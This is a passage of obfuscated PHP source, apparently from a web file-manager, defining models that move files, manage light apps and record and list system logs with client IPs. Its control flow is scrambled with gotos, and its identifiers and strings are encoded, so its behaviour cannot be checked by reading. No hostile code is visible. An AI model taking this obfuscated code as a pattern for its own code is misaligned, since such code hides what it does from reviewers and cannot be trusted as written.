"\173\x69\x6f\x3a{$F¬Õ††³¢³}\x7d\x2f"; $d³†ÉïŒç… = !0; $BÑ ÓßƒÎâ = array(); goto Cé¹Ú·ø; Cé¹Ú·ø: $Bãíòº‰µù = Model($C°’ŞªÕÙÛ[192])->where($EÃÀ‰„¡„Ï)->field($C°’ŞªÕÙÛ[2001])->select(); foreach ($Bãíòº‰µù as $BçÈµ–Íµ·) { goto FèÖáõÑå¾; aÅéÅ±¹: $cŒ‹¡×‚¸ğ = array($C°’ŞªÕÙÛ[790] => $F¬Õ††³¢³, $C°’ŞªÕÙÛ[76] => $bÖÂŠæ¦Œ); Model($C°’ŞªÕÙÛ[192])->where($EÃÀ‰„¡„Ï)->save($cŒ‹¡×‚¸ğ); goto FˆÙöòÓ½ğ; FèÖáõÑå¾: $dÒº¿…ºÁè = $BçÈµ–Íµ·[$C°’ŞªÕÙÛ[76]]; $bÖÂŠæ¦Œ = $eÏÜƒÜ‰İê . str_replace("\173\x69\157\x3a{$DªÑ’³ŠÎ÷}\175\57", $C°’ŞªÕÙÛ[33], $dÒº¿…ºÁè); if (!IO::exist($dÒº¿…ºÁè)) { $BÑ ÓßƒÎâ[] = $BçÈµ–Íµ·[$C°’ŞªÕÙÛ[445]]; $Eî¨“•½¹®->updateFileEnd($BçÈµ–Íµ·[$C°’ŞªÕÙÛ[28]], $BçÈµ–Íµ·[$C°’ŞªÕÙÛ[78]]); continue; } goto b™›ƒ‡´Šá; b™›ƒ‡´Šá: if (IO::exist($bÖÂŠæ¦Œ)) { $Eî¨“•½¹®->updateFileEnd($BçÈµ–Íµ·[$C°’ŞªÕÙÛ[28]], $BçÈµ–Íµ·[$C°’ŞªÕÙÛ[78]]); continue; } if (!IO::move($dÒº¿…ºÁè, get_path_father($bÖÂŠæ¦Œ))) { $d³†ÉïŒç… = !1; break; } $EÃÀ‰„¡„Ï = array($C°’ŞªÕÙÛ[445] => $BçÈµ–Íµ·[$C°’ŞªÕÙÛ[445]]); goto aÅéÅ±¹; FˆÙöòÓ½ğ: } $this->removeByFileID($BÑ ÓßƒÎâ); goto a©‹‹›Ğ‚¬; aô¬—’¤”ë: } public function progress($dã„Ñ‘ğçÚ, $BèçËÇÛ©…) { return Task::get($BèçËÇÛ©… . $_SERVER[¬ı§†‰ú˜¼][1999] . $dã„Ñ‘ğçÚ); } private function removeByFileID($E¼ôÙ–ô‰ = array()) { goto AÍÙÖ„³“ã; a”‹éª‚Æ§: $fƒ·ğä©ö = Model($F‚»á½•Ç™[1204])->where($f¹õ´¨Ù•)->field($F‚»á½•Ç™[394])->select(); if (!$fƒ·ğä©ö) { return; } $fƒ·ğä©ö = array_to_keyvalue($fƒ·ğä©ö, $F‚»á½•Ç™[33], $F‚»á½•Ç™[394]); goto cÈ‚¼‡Üé; cÈ‚¼‡Üé: foreach ($fƒ·ğä©ö as $aš µ±•…ñ) { Model($F‚»á½•Ç™[407])->removeNow($aš µ±•…ñ, !1); } goto B«®Ü½„Ê; AÍÙÖ„³“ã: $F‚»á½•Ç™ =& $_SERVER[¬ı§†‰ú˜¼]; if (empty($E¼ôÙ–ô‰)) { return; } $f¹õ´¨Ù• = array($F‚»á½•Ç™[445] => array($F‚»á½•Ç™[7], $E¼ôÙ–ô‰)); goto a”‹éª‚Æ§; B«®Ü½„Ê: } private function removeShareItems($DÒÍ½Ú—) { goto AÎ‘ƒ™±; aØê§¬ê«Ú: $F²‹Ãá¨çÔ = Model($Aâë’«»œà[1667])->where($e¢÷¿Ø´º)->field($Aâë’«»œà[466])->select(); if (empty($F²‹Ãá¨çÔ)) { return; } $eéÀóó¸ = array_to_keyvalue($F²‹Ãá¨çÔ, $Aâë’«»œà[33], $Aâë’«»œà[466]); goto A²…„ÂŠÂµ; AÎ‘ƒ™±: $Aâë’«»œà =& $_SERVER[¬ı§†‰ú˜¼]; $CõÀà‘¾Äö = "\173\151\x6f\72{$DÒÍ½Ú—}\175\x2f"; $e¢÷¿Ø´º = array($Aâë’«»œà[394] => 0, $Aâë’«»œà[1070] => array($Aâë’«»œà[379], "{$CõÀà‘¾Äö}\45")); goto aØê§¬ê«Ú; A²…„ÂŠÂµ: Model($Aâë’«»œà[562])->remove($eéÀóó¸); goto Bµ™èÅ˜ô; Bµ™èÅ˜ô: } } class SystemLightAppModel extends ModelBaseLight { public $optionType = "\123\x79\163\x74\145\155\x2e\114\x69\x67\x68\x74\x41\160\x70"; public $modelType = "\x53\171\163\164\x65\155\117\x70\164\151\x6f\156"; public $field = array("\156\141\155\x65", "\x67\162\x6f\165\x70", "\144\x65\x73\143", "\x63\157\x6e\x74\145\156\164"); public function listData($dĞÂŸÌ – = false, $dÎµŒóØÊ¶ = "\155\x6f\144\x69\x66\x79\x54\151\155\145", $eä ‡àïá˜ = true) { return parent::listData($dĞÂŸÌ –, $dÎµŒóØÊ¶, $eä ‡àïá˜); } public function remove($CÔÒÊ‹‘ê) { $BàÕñøï£ö = $this->findByName($CÔÒÊ‹‘ê); if (!$BàÕñøï£ö) { return !1; } return parent::remove($BàÕñøï£ö[$_SERVER[¬ı§†‰ú˜¼][392]]); } public function add($D°—ŒÆ—µ¯) { if ($this->findByName($D°—ŒÆ—µ¯[$_SERVER[¬ı§†‰ú˜¼][28]])) { return !1; } return parent::insert($D°—ŒÆ—µ¯); } public function update($aÈ²Ó¨›°, $Cô•Ç‘·»Í) { $EÌç‡µ¯ =& $_SERVER[¬ı§†‰ú˜¼]; $CŠì”ÜÜƒ‰ = $this->findByName($aÈ²Ó¨›°); $BĞÆÆ§¯÷® = $this->findByName($Cô•Ç‘·»Í[$EÌç‡µ¯[28]]); if (!$CŠì”ÜÜƒ‰ || $BĞÆÆ§¯÷® && $BĞÆÆ§¯÷®[$EÌç‡µ¯[392]] != $CŠì”ÜÜƒ‰[$EÌç‡µ¯[392]]) { return !1; } return parent::update($CŠì”ÜÜƒ‰[$EÌç‡µ¯[392]], $Cô•Ç‘·»Í); } } class SystemLogModel extends ModelBase { protected $tableName = "\163\x79\x73\x74\145\155\137\154\x6f\147"; protected $dataAuto = array(array("\143\162\145\x61\164\145\124\x69\x6d\x65", "\164\151\155\x65", "\x69\156\x73\x65\x72\164", "\x66\x75\x6e\x63\164\x69\x6f\x6e")); public $typeList; function __construct() { parent::__construct(); $this->typeList = $this->typeListAll(); } public function typeListAll() { $A­¶æÃ¾¤ =& $_SERVER[¬ı§†‰ú˜¼]; return array($A­¶æÃ¾¤[2002] => LNG($A­¶æÃ¾¤[2003]), $A­¶æÃ¾¤[2004] => LNG($A­¶æÃ¾¤[2005]), $A­¶æÃ¾¤[1630] => LNG($A­¶æÃ¾¤[2006]), $A­¶æÃ¾¤[2007] => LNG($A­¶æÃ¾¤[2008]), $A­¶æÃ¾¤[2009] => LNG($A­¶æÃ¾¤[2010]), $A­¶æÃ¾¤[2011] => LNG($A­¶æÃ¾¤[2012]), $A­¶æÃ¾¤[2013] => LNG($A­¶æÃ¾¤[2014]), $A­¶æÃ¾¤[1660] => LNG($A­¶æÃ¾¤[2014]), $A­¶æÃ¾¤[1661] => LNG($A­¶æÃ¾¤[2015]), $A­¶æÃ¾¤[2016] => LNG($A­¶æÃ¾¤[2017]), $A­¶æÃ¾¤[2018] => LNG($A­¶æÃ¾¤[2019]), $A­¶æÃ¾¤[2020] => LNG($A­¶æÃ¾¤[2021]), $A­¶æÃ¾¤[2022] => LNG($A­¶æÃ¾¤[2023]), $A­¶æÃ¾¤[1658] => LNG($A­¶æÃ¾¤[2024]), $A­¶æÃ¾¤[1665] => LNG($A­¶æÃ¾¤[2025]), $A­¶æÃ¾¤[2026] => LNG($A­¶æÃ¾¤[2027]), $A­¶æÃ¾¤[2028] => LNG($A­¶æÃ¾¤[2029]), $A­¶æÃ¾¤[2030] => LNG($A­¶æÃ¾¤[2031]), $A­¶æÃ¾¤[2032] => LNG($A­¶æÃ¾¤[2033]), $A­¶æÃ¾¤[1668] => LNG($A­¶æÃ¾¤[2034]), $A­¶æÃ¾¤[1669] => LNG($A­¶æÃ¾¤[2035]), $A­¶æÃ¾¤[2036] => LNG($A­¶æÃ¾¤[2037]), $A­¶æÃ¾¤[2038] => LNG($A­¶æÃ¾¤[2039]), $A­¶æÃ¾¤[2040] => LNG($A­¶æÃ¾¤[2041]), $A­¶æÃ¾¤[1663] => LNG($A­¶æÃ¾¤[2042]), $A­¶æÃ¾¤[2043] => LNG($A­¶æÃ¾¤[2044]), $A­¶æÃ¾¤[1662] => LNG($A­¶æÃ¾¤[2045]), $A­¶æÃ¾¤[2046] => LNG($A­¶æÃ¾¤[2047]), $A­¶æÃ¾¤[2048] => LNG($A­¶æÃ¾¤[2049]), $A­¶æÃ¾¤[2050] => LNG($A­¶æÃ¾¤[2051]), $A­¶æÃ¾¤[2052] => LNG($A­¶æÃ¾¤[2052]), $A­¶æÃ¾¤[2053] => LNG($A­¶æÃ¾¤[1634]), $A­¶æÃ¾¤[2054] => LNG($A­¶æÃ¾¤[2055]), $A­¶æÃ¾¤[2056] => LNG($A­¶æÃ¾¤[2057]), $A­¶æÃ¾¤[2058] => LNG($A­¶æÃ¾¤[2059]), $A­¶æÃ¾¤[2060] => LNG($A­¶æÃ¾¤[2061]), $A­¶æÃ¾¤[2062] => LNG($A­¶æÃ¾¤[2063]), $A­¶æÃ¾¤[2064] => LNG($A­¶æÃ¾¤[2064]), $A­¶æÃ¾¤[2065] => LNG($A­¶æÃ¾¤[2066]), $A­¶æÃ¾¤[2067] => LNG($A­¶æÃ¾¤[2068]), $A­¶æÃ¾¤[2069] => LNG($A­¶æÃ¾¤[2070]), $A­¶æÃ¾¤[2071] => LNG($A­¶æÃ¾¤[2072]), $A­¶æÃ¾¤[2073] => LNG($A­¶æÃ¾¤[2074]), $A­¶æÃ¾¤[2075] => LNG($A­¶æÃ¾¤[2076])); } private function typeFile() { $eÙÊ£’¡Œä =& $_SERVER[¬ı§†‰ú˜¼]; $eÒì’«ŒØã = array($eÙÊ£’¡Œä[1665] => array($eÙÊ£’¡Œä[1666]), $eÙÊ£’¡Œä[2020] => array($eÙÊ£’¡Œä[2077]), $eÙÊ£’¡Œä[2022] => array($eÙÊ£’¡Œä[2078]), $eÙÊ£’¡Œä[1658] => array($eÙÊ£’¡Œä[1659]), $eÙÊ£’¡Œä[2028] => array(), $eÙÊ£’¡Œä[2030] => array(), $eÙÊ£’¡Œä[2032] => array(), $eÙÊ£’¡Œä[1668] => array($eÙÊ£’¡Œä[1670]), $eÙÊ£’¡Œä[1669] => array($eÙÊ£’¡Œä[1670]), $eÙÊ£’¡Œä[2036] => array($eÙÊ£’¡Œä[2079]), $eÙÊ£’¡Œä[2038] => array($eÙÊ£’¡Œä[2079]), $eÙÊ£’¡Œä[2040] => array($eÙÊ£’¡Œä[2080]), $eÙÊ£’¡Œä[2026] => array($eÙÊ£’¡Œä[2081]), $eÙÊ£’¡Œä[1663] => array($eÙÊ£’¡Œä[2082]), $eÙÊ£’¡Œä[2043] => array($eÙÊ£’¡Œä[2083]), $eÙÊ£’¡Œä[1662] => array($eÙÊ£’¡Œä[1664])); return $eÒì’«ŒØã; } private function typeAll() { goto Cí†¼•·â±; eæÖ²—ô: foreach ($F˜º‰Ô¥Å as $E‘’¯‘Áš´ => $d–­¤Ñ‰Ó) { $FšŞøáå²ã[$d–­¤Ñ‰Ó[0]] = $FšŞøáå²ã[$E‘’¯‘Áš´]; } $FšŞøáå²ã[$fØ¬Ÿ×„Ò[1670]] = LNG($fØ¬Ÿ×„Ò[2084]); $FšŞøáå²ã[$fØ¬Ÿ×„Ò[2079]] = LNG($fØ¬Ÿ×„Ò[2085]); goto få¬¯˜¦³¡; få¬¯˜¦³¡: return $FšŞøáå²ã; goto dŒˆ”Î•ÇŠ; Cí†¼•·â±: $fØ¬Ÿ×„Ò =& $_SERVER[¬ı§†‰ú˜¼]; $FšŞøáå²ã = $this->typeList; $F˜º‰Ô¥Å = array_filter($this->typeFile()); goto eæÖ²—ô; dŒˆ”Î•ÇŠ: } public function addLog($dİÆ’æö†, $e¼ğù›Ï = array()) { goto Fïô…æ¤ù; dñÚÄçğè­: if (!$B¼»¿í•Ä») { $B¼»¿í•Ä» = (int) Session::get($Fİ¹Ñ¥â£[1816]); } $cì·ÔÈªîŸ = get_client_ip(); if (!$e¼ğù›Ï || strlen(json_encode($e¼ğù›Ï)) >= 1024) { $e¼ğù›Ï = array($Fİ¹Ñ¥â£[2086] => $cì·ÔÈªîŸ); } else { if (is_array($e¼ğù›Ï)) { $e¼ğù›Ï[$Fİ¹Ñ¥â£[2086]] = $cì·ÔÈªîŸ; } else { $e¼ğù›Ï = array($Fİ¹Ñ¥â£[1087] => $e¼ğù›Ï, $Fİ¹Ñ¥â£[2086] => $cì·ÔÈªîŸ); } } goto d‹™Ì¿ ¨‡; d‹™Ì¿ ¨‡: $e¼ğù›Ï = array($Fİ¹Ñ¥â£[1518] => Session::sign(), $Fİ¹Ñ¥â£[1519] => $B¼»¿í•Ä», $Fİ¹Ñ¥â£[29] => $dİÆ’æö†, $Fİ¹Ñ¥â£[1521] => json_encode($e¼ğù›Ï)); parent::add($e¼ğù›Ï); goto eÏÖĞâª–ä; Fïô…æ¤ù: $Fİ¹Ñ¥â£ =& $_SERVER[¬ı§†‰ú˜¼]; if (!isset($this->typeList[$dİÆ’æö†])) { return; } $B¼»¿í•Ä» = defined($Fİ¹Ñ¥â£[452]) && USER_ID ? USER_ID : (isset($e¼ğù›Ï[$Fİ¹Ñ¥â£[1527]]) ? $e¼ğù›Ï[$Fİ¹Ñ¥â£[1527]] : 0); goto dñÚÄçğè­; eÏÖĞâª–ä: } public function remove($f‹Ğ¤Íä…®) { $this->where(array($_SERVER[¬ı§†‰ú˜¼][410] => $f‹Ğ¤Íä…®))->delete(); } private function _makeOrder($fÏŞ’Ì… ½ = '') { goto fŞ¼ÑÂ·¬«; fŞ¼ÑÂ·¬«: $BÏÒò¬¿§‘ =& $_SERVER[¬ı§†‰ú˜¼]; $c‚œù«»˜“ = $BÏÒò¬¿§‘[193]; $e¦×ßìÓÀÜ = array($BÏÒò¬¿§‘[426] => $BÏÒò¬¿§‘[427], $BÏÒò¬¿§‘[428] => $BÏÒò¬¿§‘[429]); goto CøÃ õÌåì; CøÃ õÌåì: $fÑ¿Œ­¸Î‡ = Input::get($BÏÒò¬¿§‘[434], $BÏÒò¬¿§‘[7], $BÏÒò¬¿§‘[1848], array($BÏÒò¬¿§‘[1772], $BÏÒò¬¿§‘[428])); $fÑ¿Œ­¸Î‡ = $e¦×ßìÓÀÜ[$fÑ¿Œ­¸Î‡]; $fÏŞ’Ì… ½ = $fÏŞ’Ì… ½ . "{$c‚œù«»˜“}\x20{$fÑ¿Œ­¸Î‡}"; goto fæš‹®ãÅä; fæš‹®ãÅä: return $this->order($fÏŞ’Ì… ½); goto B‹Â¨˜Šëº; B‹Â¨˜Šëº: } public function get($AŸ…­¹±ó = '') { goto dç –¿²²Ò; cÌ•­å‚Ğ¯: if (!empty($AŸ…­¹±ó[$A¨ÁŒ½Ş¦º[2086]])) { $bà£Ş‚ê¨Ğ[$A¨ÁŒ½Ş¦º[429]] = array($A¨ÁŒ½Ş¦º[379], "\x25{$AŸ…­¹±ó[$A¨ÁŒ½Ş¦º[2086]]}\45"); } $f’¢Øœ¢‡ = $this->_makeOrder()->where($bà£Ş‚ê¨Ğ)->selectPage(); if (empty($f’¢Øœ¢‡[$A¨ÁŒ½Ş¦º[366]])) { show_json(array(), !0, $f’¢Øœ¢‡[$A¨ÁŒ½Ş¦º[363]]); } goto fø¼ö¼•ˆï; fø¼ö¼•ˆï: $f’¢Øœ¢‡[$A¨ÁŒ½Ş¦º[366]] = $this->logList($f’¢Øœ¢‡[$A¨ÁŒ½Ş¦º[366]]); return $f’¢Øœ¢‡; goto c“Ö×ØÃ‡‘; c«Ú»÷‰‘: if ($AŸ…­¹±ó[$A¨ÁŒ½Ş¦º[1527]]) { $bà£Ş‚ê¨Ğ[$A¨ÁŒ½Ş¦º[1527]] = $AŸ…­¹±ó[$A¨ÁŒ½Ş¦º[1527]]; } if (isset($AŸ…­¹±ó[$A¨ÁŒ½Ş¦º[722]])) { $F¸´§œ¸ëç = $AŸ…­¹±ó[$A¨ÁŒ½Ş¦º[722]]; $FÔ´áŞåÁÔ = isset($AŸ…­¹±ó[$A¨ÁŒ½Ş¦º[474]]) ? $AŸ…­¹±ó[$A¨ÁŒ½Ş¦º[474]] : time(); $bà£Ş‚ê¨Ğ[$A¨ÁŒ½Ş¦º[193]] = array($A¨ÁŒ½Ş¦º[330], array($F¸´§œ¸ëç, $FÔ´áŞåÁÔ)); } if ($AŸ…­¹±ó[$A¨ÁŒ½Ş¦º[29]]) { $F¢‡ùİ¡¿’ = explode($A¨ÁŒ½Ş¦º[47], $AŸ…­¹±ó[$A¨ÁŒ½Ş¦º[29]]); $dÃ³Öò— = $this->typeFile(); $BŞŒôÔ°À² = array(); foreach ($F¢‡ùİ¡¿’ as $b„„‘À»‡¿) { $BŞŒôÔ°À²[] = $b„„‘À»‡¿; if (isset($dÃ³Öò—[$b„„‘À»‡¿])) { $BŞŒôÔ°À² = array_merge($BŞŒôÔ°À², $dÃ³Öò—[$b„„‘À»‡¿]); } } $BŞŒôÔ°À² = array_unique($BŞŒôÔ°À²); if ($BŞŒôÔ°À²) { $bà£Ş‚ê¨Ğ[$A¨ÁŒ½Ş¦º[29]] = array($A¨ÁŒ½Ş¦º[7], $BŞŒôÔ°À²); } } else { $bà£Ş‚ê¨Ğ[$A¨ÁŒ½Ş¦º[29]] = array($A¨ÁŒ½Ş¦º[2087], $A¨ÁŒ½Ş¦º[2088]); } goto cÌ•­å‚Ğ¯; dç –¿²²Ò: $A¨ÁŒ½Ş¦º =& $_SERVER[¬ı§†‰ú˜¼]; if (!$AŸ…­¹±ó) { show_json(array()); } $bà£Ş‚ê¨Ğ = array(); goto c«Ú»÷‰‘; c“Ö×ØÃ‡‘: } private function ipAddress(&$fà‚âĞ ƒ) { $bšàÔ‘Ÿ’‰ =& $_SERVER[¬ı§†‰ú˜¼]; if (!empty($fà‚âĞ ƒ[$bšàÔ‘Ÿ’‰[2086]])) { $d¡Å˜ö…‚ = IpLocation::get($fà‚âĞ ƒ[$bšàÔ‘Ÿ’‰[2086]]); } else { $d¡Å˜ö…‚ = LNG($bšàÔ‘Ÿ’‰[2089]); } $fà‚âĞ ƒ[$bšàÔ‘Ÿ’‰[2090]] = $d¡Å˜ö…‚; } private function descZipDownload($c°öÌ”¡·¡, &$a´²íêì‡†) { $AÒÌ÷¡´‹Š =& $_SERVER[¬ı§†‰ú˜¼]; if (!isset($c°öÌ”¡·¡[$AÒÌ÷¡´‹Š[2091]])) { return; } $a¡¿Ú‚°î = json_decode($c°öÌ”¡·¡[$AÒÌ÷¡´‹Š[2091]], !0); foreach ($a¡¿Ú‚°î as $Fù‘ô‹¬ë») { try { $bˆëèå Š = IO::infoFull($Fù‘ô‹¬ë»[$AÒÌ÷¡´‹Š[76]]); } catch (Exception $aä¥Üçœ•Â) { continue; } $c°öÌ”¡·¡[$AÒÌ÷¡´‹Š[76]] = $Fù‘ô‹¬ë»[$AÒÌ÷¡´‹Š[76]]; $a´²íêì‡†[] = $c°öÌ”¡·¡[$AÒÌ÷¡´‹Š[394]] = $bˆëèå Š[$AÒÌ÷¡´‹Š[394]]; $a´²íêì‡†[] = $c°öÌ”¡·¡[$AÒÌ÷¡´‹Š[1904]] = $bˆëèå Š[$AÒÌ÷¡´‹Š[476]]; break; } return $c°öÌ”¡·¡; } private function getSourceList(&$fåÂàˆßó¯) { $B“Åğ¥‡·ì =& $_SERVER[¬ı§†‰ú˜¼]; $eà¤ÙÖ—‡ = array(); foreach ($fåÂàˆßó¯ as $cÇÛËŒ‚” => $cÕóÍˆÑ‘‘) { goto Aº†º˜“³; Aº†º˜“³: $c©ùİé†Ö = json_decode($cÕóÍˆÑ‘‘[$B“Åğ¥‡·ì[429]], !0); if ($cÕóÍˆÑ‘‘[$B“Åğ¥‡·ì[29]] == $B“Åğ¥‡·ì[1661]) { $c©ùİé†Ö = $this->descZipDownload($c©ùİé†Ö, $eà¤ÙÖ—‡); $fåÂàˆßó¯[$cÇÛËŒ‚”][$B“Åğ¥‡·ì[429]] = json_encode($c©ùİé†Ö); continue; } if (strpos($cÕóÍˆÑ‘‘[$B“Åğ¥‡·ì[29]], $B“Åğ¥‡·ì[1905]) !== 0) { if (!isset($c©ùİé†Ö[$B“Åğ¥‡·ì[76]]) || strpos($cÕóÍˆÑ‘‘[$B“Åğ¥‡·ì[29]], $B“Åğ¥‡·ì[2092]) !== 0) { continue; } try { $aÍè½Æ÷ÙÊ = IO::infoFull($c©ùİé†Ö[$B“Åğ¥‡·ì[76]]); } catch (Exception $A†”é†³®â) { continue; } $eà¤ÙÖ—‡[] = $c©ùİé†Ö[$B“Åğ¥‡·ì[394]] = $aÍè½Æ÷ÙÊ[$B“Åğ¥‡·ì[394]]; $eà¤ÙÖ—‡[] = $c©ùİé†Ö[$B“Åğ¥‡·ì[1904]] = $aÍè½Æ÷ÙÊ[$B“Åğ¥‡·ì[476]]; $fåÂàˆßó¯[$cÇÛËŒ‚”][$B“Åğ¥‡·ì[429]] = json_encode($c©ùİé†Ö); continue; } goto Dï¬ò£”¡; Dï¬ò£”¡: $eà¤ÙÖ—‡[] = $c©ùİé†Ö[$B“Åğ¥‡·ì[394]]; $eà¤ÙÖ—‡[] = $c©ùİé†Ö[$B“Åğ¥‡·ì[1904]]; if ($c©ùİé†Ö[$B“Åğ¥‡·ì[29]] == $B“Åğ¥‡·ì[519]) { $eà¤ÙÖ—‡[] = $c©ùİé†Ö[$B“Åğ¥‡·ì[429]][$B“Åğ¥‡·ì[1054]]; $eà¤ÙÖ—‡[] = $c©ùİé†Ö[$B“Åğ¥‡·ì[429]][$B“Åğ¥‡·ì[1055]]; } goto bàåå“†ë•; bàåå“†ë•: if ($c©ùİé†Ö[$B“Åğ¥‡·ì[29]] == $B“Åğ¥‡·ì[1912]) { $eà¤ÙÖ—‡[] = $c©ùİé†Ö[$B“Åğ¥‡·ì[429]][$B“Åğ¥‡·ì[394]]; } goto a¯†„·îØé; a¯†„·îØé: } if (!$eà¤ÙÖ—‡) { return array(); } return Model($B“Åğ¥‡·ì[798])->sourceListInfo($eà¤ÙÖ—‡, !0); } private function logList($cèÕ‹‡†§½) { goto Eâ¢ÁÙàÙ; Då¢ßµ¾Í¨: $AÃÂÕãæ« = $this->getSourceList($cèÕ‹‡†§½); $aòô†²ˆ = $this->typeAll(); $EÏÏ¬ÑÉĞ÷ = array(); goto B²±¤•Øˆ; B²±¤•Øˆ: $CæùÚÓƒ‘´ = array(); foreach ($cèÕ‹‡†§½ as $cŠ¤‚­Æñ¨ => $A°¼ºÉœ©) { goto bØ ƒÆô«Ù; d“Úš…ï¬¡: $A°¼ºÉœ©[$cõ¢–æ¥Â™[28]] = isset($c­œŒ…·[$cõ¢–æ¥Â™[28]]) ? $c­œŒ…·[$cõ¢–æ¥Â™[28]] : LNG($cõ¢–æ¥Â™[2089]); $A°¼ºÉœ©[$cõ¢–æ¥Â™[1954]] = isset($c­œŒ…·[$cõ¢–æ¥Â™[1954]]) ? $c­œŒ…·[$cõ¢–æ¥Â™[1954]] : $cõ¢–æ¥Â™[33]; $A°¼ºÉœ©[$cõ¢–æ¥Â™[1431]] = isset($aòô†²ˆ[$c‘Ëª»ğñˆ]) ? $aòô†²ˆ[$c‘Ëª»ğñˆ] : $BîÖ„àó­; goto CëÀÁ†‰; CëÀÁ†‰: $A°¼ºÉœ©[$cõ¢–æ¥Â™[1847]] = $c­œŒ…·; $aªË£ŒØ˜Ï = json_decode($A°¼ºÉœ©[$cõ¢–æ¥Â™[429]], !0); $A°¼ºÉœ©[$cõ¢–æ¥Â™[2086]] = isset($aªË£ŒØ˜Ï[$cõ¢–æ¥Â™[2086]]) ? $aªË£ŒØ˜Ï[$cõ¢–æ¥Â™[2086]] : $cõ¢–æ¥Â™[33]; goto cØƒ‚šï¾; bØ ƒÆô«Ù: $c‘Ëª»ğñˆ = $A°¼ºÉœ©[$cõ¢–æ¥Â™[29]]; $c­œŒ…· = isset($C½…ãÒ«É×[$A°¼ºÉœ©[$cõ¢–æ¥Â™[1527]]]) ? $C½…ãÒ«É×[$A°¼ºÉœ©[$cõ¢–æ¥Â™[1527]]] : !1; $BîÖ„àó­ = strpos($c‘Ëª»ğñˆ, $cõ¢–æ¥Â™[2093]) === 0 ? LNG($cõ¢–æ¥Â™[2094]) : LNG($cõ¢–æ¥Â™[2089]); goto d“Úš…ï¬¡; A»÷®ŒÍ„¼: unset($A°¼ºÉœ©[$cõ¢–æ¥Â™[2095]]); $EÏÏ¬ÑÉĞ÷[] = $A°¼ºÉœ©; goto f‰‘ò’éÀ; cØƒ‚šï¾: $this->ipAddress($A°¼ºÉœ©); if (strpos($c‘Ëª»ğñˆ, $cõ¢–æ¥Â™[1905]) === 0 || isset($aªË£ŒØ˜Ï[$cõ¢–æ¥Â™[1904]])) { goto fª“Ô‚ö’ˆ; CëÆÂí…›: if ($aªË£ŒØ˜Ï[$cõ¢–æ¥Â™[1917]] && $aªË£ŒØ˜Ï[$cõ¢–æ¥Â™[1917]][$cõ¢–æ¥Â™[402]] == $cõ¢–æ¥Â™[1169]) { $CæùÚÓƒ‘´[] = $A°¼ºÉœ©[$cõ¢–æ¥Â™[392]]; unset($cèÕ‹‡†§½[$cŠ¤‚­Æñ¨]); continue; } goto dÇÜµ™Û…à; d„Ş‘Æ²¸¼: if ($aªË£ŒØ˜Ï[$cõ¢–æ¥Â™[29]] == $cõ¢–æ¥Â™[1912]) { $aªË£ŒØ˜Ï[$cõ¢–æ¥Â™[429]][$cõ¢–æ¥Â™[394]] = $AÃÂÕãæ«[$aªË£ŒØ˜Ï[$cõ¢–æ¥Â™[429]][$cõ¢–æ¥Â™[394]]]; } if ($aªË£ŒØ˜Ï[$cõ¢–æ¥Â™[29]] == $cõ¢–æ¥Â™[1656]) { $aªË£ŒØ˜Ï[$cõ¢–æ¥Â™[1917]] = $aªË£ŒØ˜Ï[$cõ¢–æ¥Â™[85]]; $aªË£ŒØ˜Ï[$cõ¢–æ¥Â™[1904]] = $aªË£ŒØ˜Ï[$cõ¢–æ¥Â™[1917]][$cõ¢–æ¥Â™[394]]; $aªË£ŒØ˜Ï[$cõ¢–æ¥Â™[85]] = !1; $aªË£ŒØ˜Ï[$cõ¢–æ¥Â™[394]] = $cõ¢–æ¥Â™[33]; } if ($aªË£ŒØ˜Ï[$cõ¢–æ¥Â™[85]] && $aªË£ŒØ˜Ï[$cõ¢–æ¥Â™[85]][$cõ¢–æ¥Â™[402]] == $cõ¢–æ¥Â™[1169]) { $CæùÚÓƒ‘´[] = $A°¼ºÉœ©[$cõ¢–æ¥Â™[392]]; unset($cèÕ‹‡†§½[$cŠ¤‚­Æñ¨]); continue; } goto CëÆÂí…›; fª“Ô‚ö’ˆ: $aªË£ŒØ˜Ï[$cõ¢–æ¥Â™[85]] = $AÃÂÕãæ«[$aªË£ŒØ˜Ï[$cõ¢–æ¥Â™[394]]]; $aªË£ŒØ˜Ï[$cõ¢–æ¥Â™[1917]] = $AÃÂÕãæ«[$aªË£ŒØ˜Ï[$cõ¢–æ¥Â™[1904]]]; if ($aªË£ŒØ˜Ï[$cõ¢–æ¥Â™[29]] == $cõ¢–æ¥Â™[519]) { $aªË£ŒØ˜Ï[$cõ¢–æ¥Â™[429]][$cõ¢–æ¥Â™[1054]] = $AÃÂÕãæ«[$aªË£ŒØ˜Ï[$cõ¢–æ¥Â™[429]][$cõ¢–æ¥Â™[1054]]]; $aªË£ŒØ˜Ï[$cõ¢–æ¥Â™[429]][$cõ¢–æ¥Â™[1055]] = $AÃÂÕãæ«[$aªË£ŒØ˜Ï[$cõ¢–æ¥Â™[429]][$cõ¢–æ¥Â™[1055]]]; } goto d„Ş‘Æ²¸¼; dÇÜµ™Û…à: } $A°¼ºÉœ©[$cõ¢–æ¥Â™[429]] = $aªË£ŒØ˜Ï; goto A»÷®ŒÍ„¼; f‰‘ò’éÀ: } $this->clearSystemPathLog($CæùÚÓƒ‘´); goto Fã“¿…Ì†; Eâ¢ÁÙàÙ: $cõ¢–æ¥Â™ =& $_SERVER[¬ı§†‰ú˜¼]; $DÔï˜ˆø¡ = array_to_keyvalue($cèÕ‹‡†§½, $cõ¢–æ¥Â™[33], $cõ¢–æ¥Â™[1527]); $C½…ãÒ«É× = Model($cõ¢–æ¥Â™[505])->userListInfo(array_unique($DÔï˜ˆø¡)); goto Då¢ßµ¾Í¨; Fã“¿…Ì†: return $EÏÏ¬ÑÉĞ÷; goto BÏ¾Ëä‰‘; BÏ¾Ëä‰‘: } private function clearSystemPathLog($Cõì¾¦¥™İ) { $CÁ„ËƒŸ— =& $_SERVER[¬ı§†‰ú˜¼]; if (count($Cõì¾¦¥™İ) == 0) { return; } $CìÇÅÏ‰‰‡ = array($CÁ„ËƒŸ—[392] => array($CÁ„ËƒŸ—[7], array_unique($Cõì¾¦¥™İ))); $this->where($CìÇÅÏ‰‰‡)->delete(); } public function deviceList($fÔç®É©, $BÏ¦î¯®³Â = 0) { $b¾¥ÄÏ»°ï =& $_SERVER[¬ı§†‰ú˜¼]; $bÊÓ…˜†ò¶ = array($b¾¥ÄÏ»°ï[1527] => $fÔç®É©, $b¾¥ÄÏ»°ï[193] => array($b¾¥ÄÏ»°ï[970], $BÏ¦î¯®³Â), $b¾¥ÄÏ»°ï[29] => $b¾¥ÄÏ»°ï[1630]); $A•ãßæ¯¡ƒ = array(); $fµÀ²ñ‰è = 